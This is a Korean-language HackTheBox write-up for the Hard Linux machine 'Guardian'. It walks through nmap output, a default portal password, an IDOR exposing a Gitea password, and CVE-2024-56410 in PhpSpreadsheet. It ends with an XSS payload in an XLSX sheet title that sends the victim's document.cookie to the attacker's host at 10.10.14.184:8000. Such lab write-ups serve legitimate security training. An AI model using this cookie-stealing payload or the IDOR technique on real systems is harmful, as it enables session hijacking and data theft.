---
title: "Guardian (Hard)"
date: 2025-11-12
layout: single
excerpt: "Guardian은 Hard 난이도의 Linux 머신으로, 학생 포털의 기본 비밀번호 GU1234와 IDOR 취약점을 이용해 다른 사용자의 데이터를 열람하고, 이를 통해 숨겨진 Gitea 서브도메인과 자격 증명을 확보하는 것이 초기 진입점이다. Gitea에 공개된 소스코드에서 취약한 PhpSpreadsheet 버전을 확인한 뒤, XLSX 기반 XSS 취약점을 과제 제출 기능에 악용해 Lecturer → Admin 권한까지 상승하고, DB 설정과 salt가 포함된 해시 로직을 파악해 sha256(password + salt) 형식의 패스워드를 크랙함으로써 시스템 사용자 계정으로 이동한다.이후 sudo로 실행 가능한 Python 스크립트가 취약한 모듈을 import하는 점을 이용해 모듈 하이재킹으로 다음 사용자(mark)까지 권한을 확장한다. 마지막으로 mark 계정의 커스텀 바이너리 safeapache2ctl을 Ghidra 등으로 리버싱해 보면, /home/mark/confs/ 아래 Apache 설정만 허용하는 것처럼 보이지만 LoadModule/Include에 대해 상대경로 검증이 부실하다는 점이 드러나며, 이를 악용해 공격자가 작성한 악성 모듈을 root 권한 Apache가 로드하게 만들어 최종적으로 루트 권한을 탈취할 수 있다."
author_profile: true
toc: true
toc_label: "Guardian"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/guardian/guardian.png
  teaser_home_page: true
categories: [hackthebox linux]
tags: [htb, linux, docker, web, command-injection, rce, ssti, reverse-shell, priv-esc, mongodb, rocket.chat, twig, bolt-cms, chisel, capabilities, shadow, webhook]
---

![Talkative](/assets/htb-linux/guardian/guardian.png)

**Guardian**은 Hard 난이도의 Linux 머신으로, 초기 진입점은 학생 포털의 기본 비밀번호인 `GU1234`와 `IDOR` 취약점을 이용해 다른 사용자의 데이터를 열람하고, 이를 통해 숨겨진 `Gitea` 서브도메인과 자격 증명을 확보하는 것이다. Gitea에 공개된 소스코드에서 취약한 `PhpSpreadsheet` 버전을 확인한 뒤, **XLSX 기반 XSS 취약점**을 과제 제출 기능에 악용하여 **Lecturer → Admin** 권한까지 상승하고, 데이터베이스 설정과 `salt`가 포함된 해시 로직을 분석해 `sha256(password + salt)` 형식의 패스워드를 크랙함으로써 시스템 사용자 계정으로 이동한다.

이후 `sudo`로 실행 가능한 Python 스크립트가 쓰기 가능한 모듈을 `import`하는 점을 이용해 **모듈 하이재킹** 으로 다음 사용자(`mark`)까지 권한을 확장한다. 마지막 단계에서는 `mark` 계정의 커스텀 바이너리인 `safeapache2ctl`을 Ghidra 등으로 리버싱하여, 설정 파일을 `/home/mark/confs/`로 제한하는 것처럼 보이지만 `LoadModule` 및 `Include` 디렉티브의 **상대경로에 대한 검증이 부실**하다는 점을 찾아낸다. 이를 악용해 공격자가 작성한 악성 모듈과 특수한 Apache 설정을 조합하면, `safeapache2ctl -f` 실행 시 **root 권한의 Apache**가 해당 모듈을 로드하게 되고, 최종적으로 루트 권한을 탈취할 수 있다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.9.156`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.9.156 | tee nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 10:27 EST
Nmap scan report for 10.129.9.156
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9c:69:53:e1:38:3b:de:cd:42:0a:c8:6b:f8:95:b3:62 (ECDSA)
|_  256 3c:aa:b9:be:17:2d:5e:99:cc:ff:e1:91:90:38:b7:39 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://guardian.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.57 seconds
```

Nmap 스캔 결과, `SSH(22)`, `HTTP(80)` 서비스가 열려 있고, 웹은 **guardian.htb** 도메인으로 접근해야 함을 확인했다.

---

# Vulnerability Analysis

대상 웹 애플리케이션에 접속하면 **Guardian University** 라는 이름의 대학교 홈페이지가 나타난다.

메인 화면 우측 상단의 `Student Portal` 버튼을 클릭하면, `portal.guardian.htb` 하위 도메인으로 리다이렉션된다.

![Talkative](/assets/htb-linux/guardian/main.png)

호스트 설정을 마치고 `portal.guardian.htb` 에 접속하면, 아래와 같이 학생 포털 로그인 페이지가 나타난다.

![Talkative](/assets/htb-linux/guardian/login.png)

우측 상단에는 `Portal Guide` 링크가 포함된 알림 메시지가 있으며, 해당 가이드를 클릭하면 포털 사용 안내 문서로 이동한다.

가이드 내용을 분석해본 결과, **기본 비밀번호는 `GU1234`**로 설정되어 있는 것을 확인할 수 있다.

![Talkative](/assets/htb-linux/guardian/guide.png)

메인 페이지 하단의 **Student Testimonials** 섹션에는 학생들의 이름과 이메일 주소가 포함되어 있다.

이메일 형식은 `학번@guardian.htb` 패턴을 따르고 있으며, 이를 통해 학번 형식의 사용자 ID 를 유추할 수 있다.

![Talkative](/assets/htb-linux/guardian/main-id.png)

앞서 수집한 사용자 ID 중 하나를 이용해 로그인 시도를 진행한 결과, `Boone Basden` 학생의 계정(`GU0142023`)으로 포털에 성공적으로 접속할 수 있었다.

## IDOR

왼쪽 메뉴의 `Chats` 항목을 클릭하면, 사용자의 개인 메시지함으로 이동하게 된다.

![Talkative](/assets/htb-linux/guardian/chats.png)

Chats 탭에서 하나의 메시지를 클릭하면, 다음과 같은 형태의 채팅 화면으로 이동하게 된다.

![Talkative](/assets/htb-linux/guardian/chats-url.png)

이때 URL을 살펴보면 다음과 같이 `chat_users[]` 파라미터에 숫자 값이 포함되어 있는 것을 확인할 수 있다:

```http
http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=14
```

`chat_users[]` 파라미터의 숫자를 수동으로 변경해 보았다:

![Talkative](/assets/htb-linux/guardian/chats-idor.png)

그 결과, 관리자와 `jamil.enockson` 사용자의 채팅 내용이 노출되었으며, 해당 대화에서는 다음과 같은 메시지가 포함되어 있었다:

```text
Here is your password for gitea: DHsNnk3V503
```

이를 통해 **IDOR 취약점을 이용해 jamil.enockson 계정의 비밀번호를 탈취**하는 데 성공하였다.

## Gitea

하위 도메인인 `gitea.guardian.htb` 에 접속해 본 결과, Gitea 웹 인터페이스가 구동 중인 것을 확인하였다.

![Talkative](/assets/htb-linux/guardian/gitea.png)

앞서 IDOR 취약점을 통해 탈취한 정보를 기반으로, 사용자 `jamil.enockson` 의 아이디/비밀번호(`jamil/DHsNnk3V503`) 으로 로그인을 시도한 결과 정상적으로 로그인에 성공을 하였다.

![Talkative](/assets/htb-linux/guardian/gitea-login.png)

로그인 후 Gitea 내부를 탐색하던 중, `portal.guardian.htb` 와 관련된 웹 애플리케이션 소스코드 저장소가 존재하는 것을 확인하였다.

## XSS - PhpSpreadsheet POC

레포지토리 내 `composer.json` 파일을 확인하던 중, 의존성 구성이 발견되었다:

```json
{
    "require": {
        "phpoffice/phpspreadsheet": "3.7.0",
        "phpoffice/phpword": "^1.3"
    }
}
```

여기서 사용된 `phpoffice/phpspreadsheet` 라이브러리의 3.7.0 버전은 XSS 취약점이 존재하는 것으로 알려져 있으며, 공식적으로 공개된 **[CVE‑2024‑56410](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229)**도 존재한다.

이후 실제 `portal.guardian.htb` 레포지토리의 `vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Writer/Html.php` 경로에서 아래와 같은 `generateMeta()` 함수 코드를 발견할 수 있었다:

```php
    private static function generateMeta(?string $val, string $desc): string
    {
        return ($val || $val === '0')
            ? ('      <meta name="' . $desc . '" content="' . htmlspecialchars($val, Settings::htmlEntityFlags()) . '" />' . PHP_EOL)
            : '';
    }
```

이 함수는 Excel 문서의 커스텀 메타데이터를 HTML `<meta>` 태그로 변환해 출력하는 역할을 한다.

문제는 **`$desc` 값이 `htmlspecialchars()` 와 같은 필터링 없이 그대로 HTML** 에 삽입된다는 점이다.

따라서 `$desc` 값에 `"><img src=x onerror=alert(1)>` 같은 XSS payload가 포함되면, 해당 HTML을 렌더링할 때 스크립트가 실행될 수 있는 **XSS 취약점**이 발생하게 된다.

`portal.guardian.htb` 웹 페이지를 다시 확인하던 중, 과제 제출 시 `.docx` 또는 `.xlsx` 파일을 첨부할 수 있는 기능이 있다는 것을 발견하였다:

![Talkative](/assets/htb-linux/guardian/upload.png)

Excel 문서를 생성한 후, 시트의 제목 입력란에 다음과 같은 XSS 페이로드를 삽입하였다:

```html
"><img src=x onerror="new Image().src='http://10.10.14.184:8000/?c='+document.cookie">
```






